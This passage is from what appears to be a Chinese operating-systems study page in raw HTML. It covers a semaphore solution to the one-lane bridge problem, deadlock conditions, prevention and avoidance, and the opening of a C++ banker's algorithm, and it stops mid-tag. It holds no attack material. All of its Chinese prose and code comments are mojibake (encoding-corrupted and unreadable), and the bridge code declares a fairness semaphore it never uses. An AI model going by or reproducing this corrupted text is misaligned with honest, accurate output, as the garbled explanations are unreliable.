è¿‡ç‹¬æœ¨æ¡¥â€é—®é¢˜</h3><blockquote><p>è¯·ç”¨ä¿¡å·é‡è§£å†³ä»¥ä¸‹çš„â€œè¿‡ç‹¬æœ¨æ¡¥â€é—®é¢˜ï¼šåŒä¸€æ–¹å‘çš„è¡Œäººå¯è¿ç»­è¿‡æ¡¥ï¼Œå½“æŸä¸€æ–¹å‘æœ‰äººè¿‡æ¡¥æ—¶ï¼Œå¦ä¸€æ–¹å‘çš„è¡Œäººå¿…é¡»ç­‰å¾…ï¼›å½“æŸä¸€æ–¹å‘æ— äººè¿‡æ¡¥æ—¶ï¼Œå¦ä¸€æ–¹å‘çš„è¡Œäººå¯ä»¥è¿‡æ¡¥</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">semaphore leftCount=<span class="hljs-number">0</span>,rightCount=<span class="hljs-number">0</span>;<span class="hljs-comment">//å·¦å³è¿‡æ¡¥äººæ•°</span><br>semaphore keySignal = <span class="hljs-number">1</span>;<span class="hljs-comment">//å®ç°å·¦å³ä¸¤è¾¹å…¬å¹³è¿‡æ¡¥</span><br>semaphore bridge = <span class="hljs-number">1</span>;<span class="hljs-comment">//å®ç°å·¦å³ä¸¤è¾¹è¿‡æ¡¥äº’æ–¥</span><br>semaphore leftCountSignal = <span class="hljs-number">1</span>,rightCountSignal=<span class="hljs-number">1</span>;<span class="hljs-comment">//è¿‡æ¡¥äººæ•°è®¡æ•°å™¨èµ„æº</span><br><br>reader()<br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>    &#123;      <br>      wait(leftCountSignal);  <span class="hljs-comment">//ç”³è¯·è®¡æ•°å™¨èµ„æº</span><br>      <span class="hljs-keyword">if</span>(!leftCount)wait(bridge);<span class="hljs-comment">//ä¸ºé›¶åˆ™ç”³è¯·è¿‡æ¡¥èµ„æº</span><br>      leftCount++;<br>      signal(leftCountSignal); <span class="hljs-comment">//é‡Šæ”¾è®¡æ•°å™¨èµ„æº</span><br>         <br>      ...<br>      è¿‡æ¡¥<br>      ...<br>  <br>      wait(leftCountSignal);  <span class="hljs-comment">//ç”³è¯·è®¡æ•°å™¨èµ„æº</span><br>      leftCount--;<br>      <span class="hljs-keyword">if</span>(!leftCount)signal(bridge);<span class="hljs-comment">//ä¸ºé›¶åˆ™é‡Šæ”¾è¿‡æ¡¥èµ„æº</span><br>      signal(leftCountSignal); <span class="hljs-comment">//é‡Šæ”¾è¯»è€…è®¡æ•°å™¨èµ„æº</span><br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">right_people</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>    &#123;      <br>      wait(rightCountSignal);  <span class="hljs-comment">//ç”³è¯·è®¡æ•°å™¨èµ„æº</span><br>      <span class="hljs-keyword">if</span>(!rightCount)wait(bridge);<span class="hljs-comment">//ä¸ºé›¶åˆ™ç”³è¯·è¿‡æ¡¥èµ„æº</span><br>      rightCount++;<br>      signal(rightCountSignal); <span class="hljs-comment">//é‡Šæ”¾è®¡æ•°å™¨èµ„æº</span><br>         <br>      ...<br>      è¿‡æ¡¥<br>      ...<br>  <br>      wait(rightCountSignal);  <span class="hljs-comment">//ç”³è¯·è®¡æ•°å™¨èµ„æº</span><br>      rightCount--;<br>      <span class="hljs-keyword">if</span>(!rightCount)signal(bridge);<span class="hljs-comment">//ä¸ºé›¶åˆ™é‡Šæ”¾è¿‡æ¡¥èµ„æº</span><br>      signal(rightCountSignal); <span class="hljs-comment">//é‡Šæ”¾è¯»è€…è®¡æ•°å™¨èµ„æº</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="ç¬¬7ç« -æ­»é”"><a class="markdownIt-Anchor" href="#ç¬¬7ç« -æ­»é”"></a> ç¬¬7ç«  æ­»é”</h1><h2 id="71-ç³»ç»Ÿæ¨¡å‹"><a class="markdownIt-Anchor" href="#71-ç³»ç»Ÿæ¨¡å‹"></a> 7.1 ç³»ç»Ÿæ¨¡å‹</h2><p>å½“ä¸€ç»„è¿›ç¨‹ä¸­çš„æ¯ä¸ªè¿›ç¨‹éƒ½åœ¨ç­‰å¾…ä¸€ä¸ªäº‹ä»¶ï¼Œ è€Œè¿™ä¸€äº‹ä»¶åªèƒ½ç”±è¿™ä¸€ç»„è¿›ç¨‹çš„å¦ ä¸€è¿›ç¨‹å¼•èµ·ï¼Œ é‚£ä¹ˆè¿™ç»„è¿›ç¨‹å°±å¤„äºæ­»é”çŠ¶æ€ã€‚</p><h2 id="72-æ­»é”ç‰¹å¾"><a class="markdownIt-Anchor" href="#72-æ­»é”ç‰¹å¾"></a> 7.2 æ­»é”ç‰¹å¾</h2><h3 id="721-å¿…è¦æ¡ä»¶"><a class="markdownIt-Anchor" href="#721-å¿…è¦æ¡ä»¶"></a> 7.2.1 å¿…è¦æ¡ä»¶</h3><p>å¦‚æœåœ¨ä¸€ä¸ªç³»ç»Ÿä¸­ä¸‹é¢4ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³ï¼Œé‚£ä¹ˆä¼šå¼•èµ·<strong>æ­»é”</strong>ã€‚</p><ol><li><strong>äº’æ–¥ï¼š</strong> è‡³å°‘æœ‰ä¸€ä¸ªèµ„æºå¿…é¡»å¤„äºéå…±äº«æ¨¡å¼ï¼Œå³ä¸€æ¬¡åªæœ‰ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨ã€‚ å¦‚æœå¦ä¸€è¿›ç¨‹ç”³è¯·è¯¥èµ„æºï¼Œé‚£ä¹ˆç”³è¯·è¿›ç¨‹å¿…é¡»ç­‰åˆ°è¯¥èµ„æºè¢«é‡Šæ”¾ä¸ºæ­¢ã€‚</li><li><strong>å æœ‰å¹¶ç­‰å¾…ï¼š</strong> ä¸€ä¸ªè¿›ç¨‹å¿…é¡»å æœ‰è‡³å°‘ä¸€ä¸ªèµ„æºï¼Œå¹¶ç­‰å¾…å¦ä¸€èµ„æºï¼Œ è€Œè¯¥èµ„æºä¸ºå…¶ä»–è¿›ç¨‹æ‰€å æœ‰ã€‚</li><li><strong>éæŠ¢å ï¼š</strong> èµ„æºä¸èƒ½è¢«æŠ¢å ï¼Œå³èµ„æºåªèƒ½åœ¨è¿›ç¨‹å®Œæˆä»»åŠ¡åè‡ªåŠ¨é‡Šæ”¾ã€‚</li><li><strong>å¾ªç¯ç­‰å¾…ï¼š</strong> æœ‰ä¸€ç»„ç­‰å¾…è¿›ç¨‹ï½›P0ï¼ŒP1ï¼Œ â€¦ï¼ŒPn}ï¼Œ P0ç­‰å¾…çš„èµ„æºä¸ºP1æ‰€å æœ‰ï¼Œ P1ç­‰å¾…çš„èµ„æºä¸ºP2æ‰€å æœ‰ï¼Œ â€¦â€¦ï¼ŒPn-1ç­‰å¾…çš„èµ„æºä¸ºPn æ‰€å æœ‰ï¼Œ Pn ç­‰å¾…çš„èµ„æºä¸ºP0æ‰€å æœ‰ã€‚</li></ol><p>åœ¨æ­¤ï¼Œ å¼ºè°ƒæ‰€æœ‰4ä¸ªæ¡ä»¶å¿…é¡»åŒæ—¶æ»¡è¶³æ‰ä¼šå‡ºç°æ­»é”ã€‚</p><h3 id="722-èµ„æºåˆ†é…å›¾"><a class="markdownIt-Anchor" href="#722-èµ„æºåˆ†é…å›¾"></a> 7.2.2 èµ„æºåˆ†é…å›¾</h3><p><img src="/posts/8ce3e425/image-20220110122604071.png" alt="image-20220110122604071"></p><p>æ ¹æ®èµ„æºåˆ†é…å›¾çš„å®šä¹‰ï¼Œå¯ä»¥è¯æ˜ï¼šå¦‚æœåˆ†é…å›¾æ²¡æœ‰ç¯ï¼Œé‚£ä¹ˆç³»ç»Ÿå°±æ²¡æœ‰è¿›ç¨‹æ­»é”ã€‚å¦‚æœåˆ†é…å›¾æœ‰ç¯ï¼Œé‚£ä¹ˆå¯èƒ½å­˜åœ¨æ­»é”ã€‚</p><p><img src="/posts/8ce3e425/image-20220110122939209.png" alt="image-20220110122939209"></p><h2 id="73-æ­»é”å¤„ç†æ–¹æ³•"><a class="markdownIt-Anchor" href="#73-æ­»é”å¤„ç†æ–¹æ³•"></a> 7.3 æ­»é”å¤„ç†æ–¹æ³•</h2><p>ä»åŸç†ä¸Šæ¥è¯´ï¼Œ æœ‰ä¸‰ç§æ–¹æ³•å¯å¤„ç†æ­»é”é—®é¢˜ï¼š</p><ul><li>å¯ä½¿ç”¨åè®®ä»¥é¢„é˜²æˆ–é¿å…æ­»é”ï¼Œç¡®ä¿ç³»ç»Ÿä¸ä¼šè¿›å…¥æ­»é”çŠ¶æ€ã€‚</li><li>å¯å…è®¸ç³»ç»Ÿè¿›å…¥æ­»é”çŠ¶æ€ï¼Œç„¶åæ£€æµ‹å®ƒï¼Œå¹¶åŠ ä»¥æ¢å¤ã€‚</li><li>å¯å¿½è§†è¿™ä¸ªé—®é¢˜ï¼Œè®¤ä¸ºæ­»é”ä¸å¯èƒ½åœ¨ç³»ç»Ÿå†…å‘ç”Ÿã€‚</li></ul><h2 id="74-æ­»é”é¢„é˜²"><a class="markdownIt-Anchor" href="#74-æ­»é”é¢„é˜²"></a> 7.4 æ­»é”é¢„é˜²</h2><p>å‡ºç°æ­»é”æœ‰4ä¸ªå¿…è¦æ¡ä»¶ã€‚ åªè¦ç¡®ä¿è‡³å°‘ä¸€ä¸ªå¿…è¦æ¡ä»¶ä¸æˆç«‹ï¼Œå°±èƒ½é¢„é˜²æ­»é”å‘ç”Ÿã€‚</p><h3 id="741-äº’æ–¥"><a class="markdownIt-Anchor" href="#741-äº’æ–¥"></a> 7.4.1 äº’æ–¥</h3><p>å¯¹äº<strong>éå…±äº«èµ„æº</strong>ï¼Œå¿…é¡»è¦æœ‰äº’æ–¥æ¡ä»¶ã€‚</p><p>å¦ä¸€æ–¹é¢ï¼Œ<strong>å…±äº«èµ„æº</strong>ä¸è¦æ±‚äº’æ–¥è®¿é—®ï¼Œå› æ­¤ä¸ä¼šæ¶‰åŠæ­»é”ã€‚</p><p>é€šå¸¸ä¸èƒ½é€šè¿‡å¦å®šäº’æ–¥æ¡ä»¶æ¥é¢„é˜²æ­»é”ï¼šæœ‰çš„èµ„æºèº«å°±æ˜¯éå…±äº«çš„ã€‚</p><h3 id="742-å æœ‰å¹¶ç­‰å¾…"><a class="markdownIt-Anchor" href="#742-å æœ‰å¹¶ç­‰å¾…"></a> 7.4.2 å æœ‰å¹¶ç­‰å¾…</h3><p>ä¸ºäº†ç¡®ä¿å æœ‰å¹¶ç­‰å¾…æ¡ä»¶ä¸ä¼šåœ¨ç³»ç»Ÿå†…å‡ºç°ï¼Œå¿…é¡»ä¿è¯ï¼šå½“ ä¸€ä¸ªè¿›ç¨‹ç”³è¯·ä¸€ä¸ªèµ„æºæ—¶ï¼Œå®ƒä¸èƒ½å æœ‰å…¶ä»–èµ„æºã€‚</p><ul><li><p>ä¸€ç§å¯ä»¥ä½¿ç”¨çš„åè®®æ˜¯<strong>æ¯ä¸ªè¿›ç¨‹åœ¨æ‰§è¡Œå‰ç”³è¯·å¹¶è·å¾—æ‰€æœ‰èµ„æº</strong>ã€‚ å¯ä»¥å®ç°é€šè¿‡è¦æ±‚ç”³è¯·èµ„æºçš„ç³»ç»Ÿè°ƒç”¨åœ¨æ‰€æœ‰å…¶ä»–ç³»ç»Ÿè°ƒç”¨ä¹‹å‰è¿›è¡Œã€‚</p></li><li><p>å¦å¤–ä¸€ç§åè®®å…è®¸<strong>è¿›ç¨‹åœ¨æ²¡æœ‰èµ„æºæ—¶æ‰å¯ç”³è¯·èµ„æº</strong>ã€‚ ä¸€ä¸ªè¿›ç¨‹å¯ç”³è¯·ä¸€äº›èµ„æºå¹¶ä½¿ç”¨å®ƒä»¬ã€‚ ç„¶è€Œï¼Œ åœ¨å®ƒç”³è¯·æ›´å¤šå…¶ä»–èµ„æºä¹‹å‰ï¼Œ å®ƒå¿…é¡»é‡Šæ”¾å…¶ç°å·±åˆ†é…çš„æ‰€æœ‰èµ„æºã€‚</p></li></ul><p>è¿™ä¸¤ç§åè®®æœ‰ä¸¤ä¸ªä¸»è¦ç¼ºç‚¹ã€‚</p><ul><li>ç¬¬ä¸€ï¼Œ èµ„æºåˆ©ç”¨ç‡å¯èƒ½æ¯”è¾ƒä½ï¼Œå› ä¸ºè®¸å¤šèµ„æºå¯èƒ½å·±åˆ†é…ï¼Œ ä½†æ˜¯å¾ˆé•¿æ—¶é—´æ²¡æœ‰è¢«ä½¿ç”¨ã€‚</li><li>ç¬¬äºŒï¼Œ å¯èƒ½å‘ç”Ÿé¥¥é¥¿ã€‚ ä¸€ä¸ªè¿›ç¨‹å¦‚éœ€è¦å¤šä¸ªå¸¸ç”¨èµ„æºï¼Œ å¯èƒ½ä¼šæ°¸ä¹…ç­‰å¾…ï¼Œ å› ä¸ºå…¶æ‰€éœ€è¦çš„èµ„æºä¸­è‡³å°‘æœ‰ä¸€ä¸ªå·±åˆ†é…ç»™å…¶ä»–è¿›ç¨‹ã€‚</li></ul><h3 id="743-éæŠ¢å "><a class="markdownIt-Anchor" href="#743-éæŠ¢å "></a> 7.4.3 éæŠ¢å </h3><p>ç¬¬ä¸‰ä¸ªå¿…è¦æ¡ä»¶æ˜¯å¯¹å·±åˆ†é…çš„èµ„æºä¸èƒ½æŠ¢å ã€‚ ä¸ºäº†ç¡®ä¿è¿™ä¸€æ¡ä»¶ä¸æˆç«‹ï¼Œ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹åè®®ï¼šå¦‚æœä¸€ä¸ªè¿›ç¨‹å æœ‰èµ„æºå¹¶ç”³è¯·å¦ä¸€ä¸ªä¸èƒ½ç«‹å³åˆ†é…çš„èµ„æºï¼Œ é‚£ä¹ˆå…¶ç°å·±åˆ†é…çš„èµ„æºéƒ½å¯è¢«æŠ¢å ã€‚ æ¢å¥è¯è¯´ï¼Œ è¿™äº›èµ„æºéƒ½è¢«éšå¼åœ°é‡Šæ”¾äº†ã€‚</p><p>è¿™ä¸ªåè®®é€šå¸¸åº”ç”¨äºçŠ¶æ€å¯ä»¥ä¿å­˜å’Œæ¢å¤çš„èµ„æºï¼Œå¦‚CPUå¯„å­˜å™¨å’Œå†…å­˜ã€‚å®ƒä¸€èˆ¬ä¸é€‚ç”¨äºå…¶ä»–èµ„æºï¼Œ å¦‚æ‰“å°æœºå’Œç£å¸¦é©±åŠ¨å™¨ã€‚</p><h3 id="744-å¾ªç¯ç­‰å¾…"><a class="markdownIt-Anchor" href="#744-å¾ªç¯ç­‰å¾…"></a> 7.4.4 å¾ªç¯ç­‰å¾…</h3><p>æ­»é”çš„ç¬¬4ä¸ªä¹Ÿæ˜¯æœ€åä¸€ä¸ªæ¡ä»¶æ˜¯å¾ªç¯ç­‰å¾…ã€‚</p><p>ä¸€ä¸ªç¡®ä¿æ­¤æ¡ä»¶ä¸æˆç«‹çš„æ–¹æ³•æ˜¯å¯¹æ‰€æœ‰èµ„æºç±»å‹è¿›è¡Œå®Œå…¨æ’åºï¼Œä¸”è¦æ±‚æ¯ä¸ªè¿›ç¨‹æŒ‰é€’å¢é¡ºåºæ¥ç”³è¯·èµ„æº</p><h2 id="75-æ­»é”é¿å…"><a class="markdownIt-Anchor" href="#75-æ­»é”é¿å…"></a> 7.5 æ­»é”é¿å…</h2><p>æ­»é”é¢„é˜²ç®—æ³•ä¸­ï¼Œé€šè¿‡é™åˆ¶èµ„æºç”³è¯·çš„æ–¹æ³•æ¥é¢„é˜²æ­»é”ã€‚è¿™ç§é™åˆ¶ç¡®ä¿4ä¸ªå¿…è¦æ¡ä»¶ä¹‹ä¸€ä¸ä¼šå‘ç”Ÿï¼Œå› æ­¤æ­»é”ä¸æˆç«‹ã€‚ ç„¶è€Œï¼Œé€šè¿‡è¿™ç§æ–¹æ³•é¢„é˜²æ­»é”çš„å‰¯ä½œç”¨æ˜¯ä½è®¾å¤‡ä½¿ç”¨ç‡å’Œç³»ç»Ÿååç‡ã€‚</p><p><strong>æ­»é”é¿å…ç®—æ³•</strong>åŠ¨æ€åœ°æ£€æµ‹èµ„æºåˆ†é…çŠ¶æ€ä»¥ç¡®ä¿å¾ªç¯ç­‰å¾…æ¡ä»¶ä¸å¯èƒ½æˆç«‹ã€‚èµ„æºåˆ†é…çŠ¶æ€æ˜¯ç”±å¯ç”¨èµ„æºå’Œå·±åˆ†é…èµ„æºï¼ŒåŠè¿›ç¨‹æœ€å¤§éœ€æ±‚æ‰€å†³å®šçš„ã€‚</p><h3 id="751-å®‰å…¨çŠ¶æ€"><a class="markdownIt-Anchor" href="#751-å®‰å…¨çŠ¶æ€"></a> 7.5.1 å®‰å…¨çŠ¶æ€</h3><p>å¦‚æœç³»ç»Ÿèƒ½æŒ‰æŸä¸ªé¡ºåºä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é…èµ„æºï¼ˆ ä¸è¶…è¿‡å…¶æœ€å¤§å€¼ï¼‰å¹¶èƒ½é¿å…æ­»é”ï¼Œ é‚£ä¹ˆç³»ç»ŸçŠ¶æ€å°±æ˜¯å®‰å…¨çš„ã€‚ æ›´ä¸ºå‡†ç¡®åœ°è¯´ï¼Œ å¦‚æœå­˜åœ¨ä¸€ä¸ª<strong>å®‰å…¨åºåˆ—</strong>ï¼Œ é‚£ä¹ˆç³»ç»Ÿå¤„äº<strong>å®‰å…¨çŠ¶æ€</strong>ã€‚</p><blockquote><p>å®‰å…¨åºåˆ—ï¼š</p><p>è¿›ç¨‹é¡ºåºï¼œP1ï¼ŒP2ï¼Œâ€¦ï¼ŒPnï¼ï¼Œå¦‚æœå¯¹äºæ¯ä¸ª Pi, Piä»ç„¶å¯ä»¥ç”³è¯·çš„èµ„æºæ•°å°äºå½“å‰å¯ç”¨èµ„æºåŠ ä¸Šæ‰€æœ‰è¿›ç¨‹Pjï¼ˆå…¶ä¸­j&lt;iï¼‰ æ‰€å æœ‰çš„èµ„æºï¼Œ é‚£ä¹ˆè¿™ä¸€é¡ºåºç§°ä¸ºå®‰å…¨åºåˆ—ã€‚</p></blockquote><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¿›ç¨‹Piæ‰€éœ€è¦çš„èµ„æºå³ä½¿ä¸èƒ½ç«‹å³å¯ç”¨ï¼ŒPiä¹Ÿå¯ç­‰å¾…ç›´åˆ°æ‰€æœ‰Pjé‡Šæ”¾å…¶èµ„æºã€‚ å½“å®ƒä»¬å®Œæˆæ—¶ï¼ŒPiå¯å¾—åˆ°å…¶æ‰€éœ€è¦çš„æ‰€æœ‰èµ„æºï¼Œ å®Œæˆå…¶ç»™å®šä»»åŠ¡ï¼Œè¿”å›å…¶æ‰€åˆ†é…çš„èµ„æºäº•ç»ˆæ­¢ã€‚</p><p><img src="/posts/8ce3e425/image-20220110131605918.png" alt="image-20220110131605918"></p><h3 id="752-èµ„æºåˆ†é…å›¾ç®—æ³•"><a class="markdownIt-Anchor" href="#752-èµ„æºåˆ†é…å›¾ç®—æ³•"></a> 7.5.2 èµ„æºåˆ†é…å›¾ç®—æ³•</h3><p>å‡è®¾è¿›ç¨‹Piç”³è¯·èµ„æºRjã€‚åªæœ‰åœ¨å°†ç”³è¯·è¾¹Piâ†’Rj å˜æˆåˆ†é…è¾¹Rjâ†’Pi è€Œä¸ä¼šå¯¼è‡´èµ„æºåˆ†é…å›¾å½¢æˆç¯æ—¶ï¼Œæ‰å…è®¸ç”³è¯·ã€‚æ³¨æ„ï¼Œé€šè¿‡é‡‡ç”¨ç¯æ£€æµ‹ç®—æ³•ï¼Œæ£€æµ‹å®‰å…¨æ€§ã€‚æ£€æµ‹å›¾ä¸­æ˜¯å¦æœ‰ç¯çš„ç®—æ³•éœ€è¦n<sup>2</sup>çº§çš„æ“ä½œï¼Œå…¶ä¸­næ˜¯ç³»ç»Ÿçš„è¿›ç¨‹æ•°é‡ã€‚</p><p>å¦‚æœæ²¡æœ‰ç¯å­˜åœ¨ï¼Œ é‚£ä¹ˆèµ„æºåˆ†é…ä¼šä½¿å¾—ç³»ç»Ÿå¤„äºå®‰å…¨çŠ¶æ€ã€‚å¦‚æœæœ‰ç¯å­˜åœ¨ï¼Œ é‚£ä¹ˆåˆ†é…ä¼šå¯¼è‡´ç³»ç»Ÿå¤„äºä¸å®‰å…¨çŠ¶æ€ã€‚å› æ­¤ï¼Œè¿›ç¨‹Piå¿…é¡»ç­‰å¾…å…¶èµ„æºç”³è¯·è¢«æ»¡è¶³ã€‚</p><p><img src="/posts/8ce3e425/image-20220110132333116.png" alt="image-20220110132333116"></p><h3 id="753-é“¶è¡Œå®¶ç®—æ³•"><a class="markdownIt-Anchor" href="#753-é“¶è¡Œå®¶ç®—æ³•"></a> 7.5.3 é“¶è¡Œå®¶ç®—æ³•</h3><h4 id="1ç®—æ³•åŸç†"><a class="markdownIt-Anchor" href="#1ç®—æ³•åŸç†"></a> 1ï¼‰ç®—æ³•åŸç†</h4><p><img src="/posts/8ce3e425/image-20220110134858471.png" alt="image-20220110134858471"></p><ol><li><p>å®‰å…¨æ€§ç®—æ³•</p><p><img src="/posts/8ce3e425/image-20220110134809173.png" alt="image-20220110134809173"></p></li><li><p>èµ„æºè¯·æ±‚ç®—æ³•</p><p><img src="/posts/8ce3e425/image-20220110134844887.png" alt="image-20220110134844887"></p></li></ol><h4 id="2ç¼–ç¨‹å®ç°"><a class="markdownIt-Anchor" href="#2ç¼–ç¨‹å®ç°"></a> 2ï¼‰ç¼–ç¨‹å®ç°</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> N 100</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> M 100</span><br><span class="hljs-keyword">int</span> Available[M],     <span class="hljs-comment">//æ¯ç§èµ„æºç°æœ‰çš„å®ä¾‹æ•°é‡</span><br>    Max[N][M],        <span class="hljs-comment">//æ¯ä¸ªè¿›ç¨‹içš„å¯¹èµ„æºjæœ€å¤§éœ€æ±‚</span><br>    Allocation[N][M], <span class="hljs-comment">//æ¯ä¸ªè¿›ç¨‹ç°åœ¨æ‰€åˆ†é…çš„æ¯ä¸ªèµ„æºçš„å®ä¾‹æ•°é‡</span><br>    Need[N][M],       <span class="hljs-comment">//æ¯ä¸ªè¿›ç¨‹è¿˜éœ€è¦çš„å‰©ä½™çš„èµ„æº</span><br>    Request[N][M],    <span class="hljs-comment">//è¿›ç¨‹èµ„æºè¯·æ±‚</span><br>    sign[N],          <span class="hljs-comment">//è®°å½•å®‰å…¨åºåˆ—</span><br>    process_num,      <span class="hljs-comment">//è¿›ç¨‹æ•°é‡</span><br>    recourse_num;     <span class="hljs-comment">//èµ„æºæ•°é‡</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-comment">//åˆå§‹åŒ–è¿›ç¨‹èµ„æºçŠ¶å†µ</span></span><br><span class="hljs-function"></span>&#123;<br>    cin &gt;&gt; process_num &gt;&gt; recourse_num;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cin &gt;&gt; Allocation[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cin &gt;&gt; Max[i][j];<br>            Need[i][j] = Max[i][j] - Allocation[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>    &#123;<br>        cin &gt;&gt; Available[j];<br>    &#125;<br>&#125;<br><span class="hljs-function"><span 